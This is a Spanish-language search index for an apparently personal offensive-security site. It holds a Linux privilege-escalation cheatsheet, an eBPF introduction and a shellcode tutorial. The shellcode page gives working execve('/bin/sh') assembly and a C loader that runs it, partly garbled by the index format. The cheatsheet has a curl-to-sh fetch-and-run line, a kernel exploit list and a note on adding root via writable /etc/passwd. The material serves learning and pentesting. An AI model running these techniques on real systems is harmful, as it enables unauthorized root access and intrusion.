{"config":{"lang":["es"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"],"fields":{"title":{"boost":1000.0},"text":{"boost":1.0},"tags":{"boost":1000000.0}}},"docs":[{"location":"","title":"Home","text":"Offensive Security \u2022 Kernel \u2022 Malware Dev        Research t\u00e9cnico, writeups y cheatsheets con foco en Linux internals, eBPF y desarrollo de malware.             Disclaimer: contenido orientado a investigaci\u00f3n y aprendizaje. No se fomenta el uso il\u00edcito ni actividades no autorizadas."},{"location":"#destacados","title":"Destacados","text":"Kernel Introducci\u00f3n a eBPF Conceptos base, objetivos y primeros pasos para instrumentaci\u00f3n y seguridad. 2025-01-09\u20226 min lectura Cheatsheet Linux Privilege Escalation Checklist r\u00e1pido con enumeraci\u00f3n, vectores t\u00edpicos y comandos clave. 2025-01-08\u20228 min lectura Malware Dev Shellcode Basics Estructura, syscalls y consideraciones pr\u00e1cticas para x86_64. 2025-01-07\u20227 min lectura"},{"location":"#secciones","title":"Secciones","text":"CTF Writeups Resoluci\u00f3n de m\u00e1quinas, notas de explotaci\u00f3n y metodolog\u00eda reproducible. Notas Cheatsheets Referencias r\u00e1pidas para pentesting, privesc, web y herramientas. R&amp;D Research Kernel security, eBPF, rootkits y malware development."},{"location":"cheatsheets/","title":"Cheatsheets","text":"<p>Referencias r\u00e1pidas para pentesting.</p>"},{"location":"cheatsheets/#disponibles","title":"Disponibles","text":"<ul> <li>Linux Privilege Escalation</li> </ul>"},{"location":"cheatsheets/#proximamente","title":"Pr\u00f3ximamente","text":"<ul> <li>Windows Privilege Escalation</li> <li>Web Application Testing</li> <li>Active Directory</li> </ul>"},{"location":"cheatsheets/linux-privesc/","title":"Linux Privilege Escalation","text":"<p>T\u00e9cnicas de escalada de privilegios en Linux.</p>"},{"location":"cheatsheets/linux-privesc/#enumeration","title":"Enumeration","text":"BashPython <p>```bash</p> <p>```python import os import subprocess</p> <p>def run(cmd: str) -&gt; str:     return subprocess.check_output(cmd, shell=True, text=True, stderr=subprocess.DEVNULL)</p> <p>print(run(\"uname -a\")) print(run(\"id\")) print(run(\"sudo -l\")) print(run(\"ip a\")) ```</p>"},{"location":"cheatsheets/linux-privesc/#system-info","title":"System info","text":"<p>uname -a cat /etc/issue</p>"},{"location":"cheatsheets/linux-privesc/#current-user","title":"Current user","text":"<p>id sudo -l</p>"},{"location":"cheatsheets/linux-privesc/#users","title":"Users","text":"<p>cat /etc/passwd | grep -E '/bin/(ba)?sh'</p>"},{"location":"cheatsheets/linux-privesc/#network","title":"Network","text":"<p>ip a ss -tulpn ```</p>"},{"location":"cheatsheets/linux-privesc/#suid-binaries","title":"SUID Binaries","text":"<p><code>bash find / -perm -4000 -type f 2&gt;/dev/null</code></p> <p>GTFOBins</p> <p>Consulta GTFOBins para t\u00e9cnicas de explotaci\u00f3n de binarios SUID.</p>"},{"location":"cheatsheets/linux-privesc/#capabilities","title":"Capabilities","text":"<p><code>bash getcap -r / 2&gt;/dev/null</code></p>"},{"location":"cheatsheets/linux-privesc/#cron-jobs","title":"Cron Jobs","text":"<p><code>bash cat /etc/crontab ls -la /etc/cron.*</code></p>"},{"location":"cheatsheets/linux-privesc/#writable-files","title":"Writable Files","text":"<p><code>bash find / -writable -type f 2&gt;/dev/null</code></p> <p>Archivos cr\u00edticos</p> <p>Si <code>/etc/passwd</code> o <code>/etc/shadow</code> son escribibles, puedes a\u00f1adir un usuario con privilegios root.</p>"},{"location":"cheatsheets/linux-privesc/#kernel-exploits","title":"Kernel Exploits","text":"Kernel CVE Nombre 2.6.22 - 3.9 CVE-2016-5195 DirtyCow 5.8 - 5.16.11 CVE-2022-0847 DirtyPipe"},{"location":"cheatsheets/linux-privesc/#automated-tools","title":"Automated Tools","text":"<p>```bash</p>"},{"location":"cheatsheets/linux-privesc/#linpeas","title":"LinPEAS","text":"<p>curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh ```</p> <p>Recursos</p> <ul> <li>HackTricks - Linux Privesc</li> <li>PayloadsAllTheThings</li> </ul>"},{"location":"research/","title":"Research","text":"<p>Investigaci\u00f3n en seguridad ofensiva.</p>"},{"location":"research/#areas","title":"\u00c1reas","text":"<ul> <li>Kernel Security \u2014 Linux internals, eBPF, rootkits</li> <li>Malware Development \u2014 Shellcode, evasi\u00f3n, loaders</li> </ul>"},{"location":"research/#ultimos-articulos","title":"\u00daltimos art\u00edculos","text":"Fecha T\u00edtulo 2025-01-09 Introducci\u00f3n a eBPF 2025-01-07 Shellcode Basics"},{"location":"research/kernel/","title":"Kernel Security","text":"<p>Linux kernel internals y seguridad.</p>"},{"location":"research/kernel/#articulos","title":"Art\u00edculos","text":"<ul> <li>Introducci\u00f3n a eBPF</li> </ul>"},{"location":"research/kernel/#proximamente","title":"Pr\u00f3ximamente","text":"<ul> <li>Linux Kernel Exploitation 101</li> <li>Writing a Simple Rootkit</li> </ul>"},{"location":"research/kernel/ebpf-intro/","title":"Introducci\u00f3n a eBPF","text":"<p>eBPF (extended Berkeley Packet Filter) permite ejecutar programas sandboxed en el kernel de Linux sin modificar su c\u00f3digo fuente.</p>"},{"location":"research/kernel/ebpf-intro/#que-es-ebpf","title":"\u00bfQu\u00e9 es eBPF?","text":"<p>Una m\u00e1quina virtual dentro del kernel que ejecuta c\u00f3digo de forma segura. Usos principales:</p> <ul> <li>Observabilidad \u2014 Tracing, profiling, monitorizaci\u00f3n</li> <li>Networking \u2014 Load balancing, firewalls, XDP</li> <li>Seguridad \u2014 Sandboxing, detecci\u00f3n de intrusiones</li> </ul> <p>Requisitos</p> <p>eBPF requiere kernel Linux 4.x+ para funcionalidades b\u00e1sicas y 5.x+ para caracter\u00edsticas avanzadas como BTF.</p>"},{"location":"research/kernel/ebpf-intro/#hook-points","title":"Hook Points","text":""},{"location":"research/kernel/ebpf-intro/#kprobes","title":"Kprobes","text":"<p>Interceptar cualquier funci\u00f3n del kernel:</p> <p><code>c SEC(\"kprobe/sys_execve\") int trace_execve(struct pt_regs *ctx) {     char comm[16];     bpf_get_current_comm(&amp;comm, sizeof(comm));     bpf_printk(\"execve: %s\\n\", comm);     return 0; }</code></p>"},{"location":"research/kernel/ebpf-intro/#tracepoints","title":"Tracepoints","text":"<p>Puntos de instrumentaci\u00f3n estables:</p> <p><code>c SEC(\"tracepoint/syscalls/sys_enter_openat\") int trace_openat(struct trace_event_raw_sys_enter *ctx) {     // ...     return 0; }</code></p>"},{"location":"research/kernel/ebpf-intro/#xdp","title":"XDP","text":"<p>Procesamiento de paquetes a bajo nivel, antes del stack de red.</p>"},{"location":"research/kernel/ebpf-intro/#compilacion","title":"Compilaci\u00f3n","text":"<p>```bash</p>"},{"location":"research/kernel/ebpf-intro/#compilar-programa-bpf","title":"Compilar programa BPF","text":"<p>clang -O2 -target bpf -c program.bpf.c -o program.bpf.o</p>"},{"location":"research/kernel/ebpf-intro/#cargar-con-bpftool","title":"Cargar con bpftool","text":"<p>sudo bpftool prog load program.bpf.o /sys/fs/bpf/my_prog ```</p>"},{"location":"research/kernel/ebpf-intro/#deteccion","title":"Detecci\u00f3n","text":"<p>```bash</p>"},{"location":"research/kernel/ebpf-intro/#listar-programas-bpf-cargados","title":"Listar programas BPF cargados","text":"<p>sudo bpftool prog list</p>"},{"location":"research/kernel/ebpf-intro/#ver-maps","title":"Ver maps","text":"<p>sudo bpftool map list ```</p> <p>Uso ofensivo</p> <p>eBPF puede usarse para crear rootkits dif\u00edciles de detectar. Monitoriza los programas BPF cargados en sistemas de producci\u00f3n.</p> <p>Recursos</p> <ul> <li>eBPF.io \u2014 Documentaci\u00f3n oficial</li> <li>libbpf-bootstrap \u2014 Templates para empezar</li> </ul>"},{"location":"research/malware-dev/","title":"Malware Development","text":"<p>Desarrollo de malware con fines educativos.</p>"},{"location":"research/malware-dev/#articulos","title":"Art\u00edculos","text":"<ul> <li>Shellcode Basics</li> </ul>"},{"location":"research/malware-dev/#proximamente","title":"Pr\u00f3ximamente","text":"<ul> <li>Process Injection</li> <li>AV/EDR Evasion</li> <li>Direct Syscalls</li> </ul> <p>Disclaimer</p> <p>Contenido exclusivamente para fines educativos en entornos controlados.</p>"},{"location":"research/malware-dev/shellcode-basics/","title":"Shellcode Basics","text":"<p>Fundamentos de desarrollo de shellcode para Linux x86-64.</p>"},{"location":"research/malware-dev/shellcode-basics/#syscall-convention","title":"Syscall Convention","text":"Register Uso RAX syscall number RDI 1st argument RSI 2nd argument RDX 3rd argument R10 4th argument <p>Referencia</p> <p>Lista completa de syscalls en <code>/usr/include/x86_64-linux-gnu/asm/unistd_64.h</code></p>"},{"location":"research/malware-dev/shellcode-basics/#execve-shellcode","title":"Execve Shellcode","text":"<p>```asm ; execve(\"/bin/sh\", NULL, NULL) section .text global _start</p> <p>_start:     xor rax, rax     xor rdx, rdx     push rax     mov rbx, 0x68732f6e69622f2f  ; \"//bin/sh\"     push rbx     mov rdi, rsp     push rax     push rdi     mov rsi, rsp     mov al, 59                   ; execve     syscall ```</p> <p>NULL bytes</p> <p>Evita instrucciones que generen bytes <code>0x00</code> como <code>mov rax, 0</code>. Usa <code>xor rax, rax</code> en su lugar.</p>"},{"location":"research/malware-dev/shellcode-basics/#compilar-y-extraer","title":"Compilar y extraer","text":"<p>```bash</p>"},{"location":"research/malware-dev/shellcode-basics/#ensamblar","title":"Ensamblar","text":"<p>nasm -f elf64 shell.asm -o shell.o ld shell.o -o shell</p>"},{"location":"research/malware-dev/shellcode-basics/#extraer-bytes","title":"Extraer bytes","text":"<p>objcopy -O binary shell shell.bin xxd -i shell.bin ```</p>"},{"location":"research/malware-dev/shellcode-basics/#testing","title":"Testing","text":"<p>```c</p>"},{"location":"research/malware-dev/shellcode-basics/#include","title":"include","text":""},{"location":"research/malware-dev/shellcode-basics/#include_1","title":"include  <p>unsigned char shellcode[] = \"\\x48\\x31\\xc0...\";</p> <p>int main() {     void exec = mmap(NULL, sizeof(shellcode),                       PROT_READ|PROT_WRITE|PROT_EXEC,                       MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);     memcpy(exec, shellcode, sizeof(shellcode));     ((void()())exec)(); } ```</p> <p><code>bash gcc -z execstack -o test test.c ./test</code></p>  <p>Disclaimer</p> <p>Este contenido es exclusivamente para fines educativos en entornos controlados.</p>    <p>Recursos</p> <ul> <li>pwntools \u2014 Framework de explotaci\u00f3n</li> <li>shellcraft \u2014 Generador de shellcode</li> </ul>","text":""},{"location":"writeups/","title":"Writeups","text":"<p>Resoluci\u00f3n de m\u00e1quinas CTF y competiciones.</p>"},{"location":"writeups/#hackthebox","title":"HackTheBox","text":"<p>Pr\u00f3ximamente</p>"},{"location":"writeups/#tryhackme","title":"TryHackMe","text":"<p>Pr\u00f3ximamente</p>"},{"location":"writeups/#ctf-competitions","title":"CTF Competitions","text":"<p>Pr\u00f3ximamente</p>"}]}